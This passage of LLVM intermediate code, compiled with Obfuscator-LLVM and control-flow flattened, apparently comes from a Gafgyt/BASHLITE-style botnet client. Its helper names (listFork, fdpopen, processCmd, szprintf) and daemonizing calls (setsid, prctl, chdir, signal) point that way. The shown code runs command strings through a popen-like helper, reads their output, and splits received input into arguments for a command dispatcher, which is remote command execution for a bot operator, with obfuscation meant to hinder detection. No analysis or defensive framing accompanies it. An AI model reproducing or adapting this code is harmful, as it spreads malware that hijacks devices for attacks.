  %412 = call i32 @strcmp(i8* %411, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.420, i32 0, i32 0)) #10
  %413 = icmp eq i32 %412, 0
  %414 = select i1 %413, i32 -726439387, i32 175806887
  store i32 %414, i32* %switchVar
  br label %loopEnd

; <label>:415:                                    ; preds = %loopEntry
  %416 = call i32 @listFork()
  %417 = icmp ne i32 %416, 0
  %418 = select i1 %417, i32 -564384946, i32 -2130452729
  store i32 %418, i32* %switchVar
  br label %loopEnd

; <label>:419:                                    ; preds = %loopEntry
  store i32 -1655982938, i32* %switchVar
  br label %loopEnd

; <label>:420:                                    ; preds = %loopEntry
  %421 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %421, i8 0, i64 1024, i32 16, i1 false)
  %422 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %423 = load i8*, i8** %24, align 8
  %424 = call i32 (i8*, i8*, ...) @szprintf(i8* %422, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.421, i32 0, i32 0), i8* %423)
  %425 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %426 = call i32 @fdpopen(i8* %425, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.411, i32 0, i32 0))
  store i32 %426, i32* %29, align 4
  store i32 -1263489376, i32* %switchVar
  br label %loopEnd

; <label>:427:                                    ; preds = %loopEntry
  %428 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %429 = load i32, i32* %29, align 4
  %430 = call i8* @fdgets(i8* %428, i32 1024, i32 %429)
  %431 = icmp ne i8* %430, null
  %432 = select i1 %431, i32 -936033318, i32 216338698
  store i32 %432, i32* %switchVar
  br label %loopEnd

; <label>:433:                                    ; preds = %loopEntry
  %434 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  call void @trim(i8* %434)
  %435 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %435, i8 0, i64 1024, i32 16, i1 false)
  %436 = call i32 @sleep(i32 1)
  store i32 -1263489376, i32* %switchVar
  br label %loopEnd

; <label>:437:                                    ; preds = %loopEntry
  %438 = load i32, i32* %29, align 4
  %439 = call i32 @fdpclose(i32 %438)
  call void @exit(i32 0) #14
  unreachable

; <label>:440:                                    ; preds = %loopEntry
  store i32 1, i32* %31, align 4
  %441 = load i8*, i8** %24, align 8
  %442 = call i8* @strtok(i8* %441, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.422, i32 0, i32 0)) #2
  store i8* %442, i8** %32, align 8
  %443 = load i8*, i8** %26, align 8
  %444 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 0
  store i8* %443, i8** %444, align 16
  store i32 1467369621, i32* %switchVar
  br label %loopEnd

; <label>:445:                                    ; preds = %loopEntry
  %446 = load i8*, i8** %32, align 8
  %447 = icmp ne i8* %446, null
  %448 = select i1 %447, i32 611533262, i32 2135501733
  store i32 %448, i32* %switchVar
  br label %loopEnd

; <label>:449:                                    ; preds = %loopEntry
  %450 = load i8*, i8** %32, align 8
  %451 = load i8, i8* %450, align 1
  %452 = zext i8 %451 to i32
  %453 = icmp ne i32 %452, 10
  %454 = select i1 %453, i32 -122633652, i32 -1099613883
  store i32 %454, i32* %switchVar
  br label %loopEnd

; <label>:455:                                    ; preds = %loopEntry
  %456 = load i8*, i8** %32, align 8
  %457 = call i64 @strlen(i8* %456) #10
  %458 = add i64 %457, 1
  %459 = call noalias i8* @malloc(i64 %458) #2
  %460 = load i32, i32* %31, align 4
  %461 = sext i32 %460 to i64
  %462 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 %461
  store i8* %459, i8** %462, align 8
  %463 = load i32, i32* %31, align 4
  %464 = sext i32 %463 to i64
  %465 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 %464
  %466 = load i8*, i8** %465, align 8
  %467 = load i8*, i8** %32, align 8
  %468 = call i64 @strlen(i8* %467) #10
  %469 = add i64 %468, 1
  call void @llvm.memset.p0i8.i64(i8* %466, i8 0, i64 %469, i32 1, i1 false)
  %470 = load i32, i32* %31, align 4
  %471 = sext i32 %470 to i64
  %472 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 %471
  %473 = load i8*, i8** %472, align 8
  %474 = load i8*, i8** %32, align 8
  %475 = call i8* @strcpy(i8* %473, i8* %474) #2
  %476 = load i32, i32* %31, align 4
  %477 = add nsw i32 %476, 1
  store i32 %477, i32* %31, align 4
  store i32 -1099613883, i32* %switchVar
  br label %loopEnd

; <label>:478:                                    ; preds = %loopEntry
  %479 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.422, i32 0, i32 0)) #2
  store i8* %479, i8** %32, align 8
  store i32 1467369621, i32* %switchVar
  br label %loopEnd

; <label>:480:                                    ; preds = %loopEntry
  %481 = load i32, i32* %31, align 4
  %482 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i32 0, i32 0
  call void @processCmd(i32 %481, i8** %482)
  %483 = load i32, i32* %31, align 4
  %484 = icmp sgt i32 %483, 1
  %485 = select i1 %484, i32 2066024746, i32 1804578726
  store i32 %485, i32* %switchVar
  br label %loopEnd

; <label>:486:                                    ; preds = %loopEntry
  store i32 1, i32* %33, align 4
  store i32 1, i32* %33, align 4
  store i32 -2102913557, i32* %switchVar
  br label %loopEnd

; <label>:487:                                    ; preds = %loopEntry
  %488 = load i32, i32* %33, align 4
  %489 = load i32, i32* %31, align 4
  %490 = icmp slt i32 %488, %489
  %491 = select i1 %490, i32 -1266677210, i32 684842587
  store i32 %491, i32* %switchVar
  br label %loopEnd

; <label>:492:                                    ; preds = %loopEntry
  %493 = load i32, i32* %33, align 4
  %494 = sext i32 %493 to i64
  %495 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 %494
  %496 = load i8*, i8** %495, align 8
  call void @free(i8* %496) #2
  store i32 1080928369, i32* %switchVar
  br label %loopEnd

; <label>:497:                                    ; preds = %loopEntry
  %498 = load i32, i32* %33, align 4
  %499 = add nsw i32 %498, 1
  store i32 %499, i32* %33, align 4
  store i32 -2102913557, i32* %switchVar
  br label %loopEnd

; <label>:500:                                    ; preds = %loopEntry
  store i32 1804578726, i32* %switchVar
  br label %loopEnd

; <label>:501:                                    ; preds = %loopEntry
  store i32 242720669, i32* %switchVar
  br label %loopEnd

; <label>:502:                                    ; preds = %loopEntry
  store i32 -1655982938, i32* %switchVar
  br label %loopEnd

; <label>:503:                                    ; preds = %loopEntry
  store i32 536053583, i32* %switchVar
  br label %loopEnd

; <label>:504:                                    ; preds = %loopEntry
  %505 = load i32, i32* %3, align 4
  ret i32 %505

loopEnd:                                          ; preds = %503, %502, %501, %500, %497, %492, %487, %486, %480, %478, %455, %449, %445, %440, %433, %427, %420, %419, %415, %410, %401, %396, %391, %388, %386, %381, %375, %373, %367, %365, %356, %346, %337, %336, %330, %327, %325, %320, %314, %311, %304, %303, %295, %289, %288, %278, %275, %274, %270, %267, %257, %251, %238, %235, %224, %218, %215, %206, %200, %199, %193, %187, %185, %181, %177, %176, %174, %173, %172, %170, %169, %165, %160, %156, %148, %147, %144, %143, %140, %139, %133, %125, %121, %120, %117, %108, %102, %92, %89, %78, %77, %65, %61, %58, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #4

declare i32 @prctl(...) #3

declare %struct._IO_FILE* @fopen(i8*, i8*) #3

; Function Attrs: nounwind
declare i8* @getcwd(i8*, i64) #4

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #4

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #3

; Function Attrs: nounwind readonly
declare i32 @strcasecmp(i8*, i8*) #1

declare i32 @fclose(%struct._IO_FILE*) #3

declare i32 @fputs(i8*, %struct._IO_FILE*) #3

; Function Attrs: nounwind
declare i32 @setsid() #4

; Function Attrs: nounwind
declare i32 @chdir(i8*) #4

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #4

declare i32 @sleep(i32) #3

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146576028}
!2 = !{i32 -2146575337}
!3 = !{i32 -2146574643}
!4 = !{i32 -2146573883}
!5 = !{i32 -2146573060}
!6 = !{i32 -2146572153}
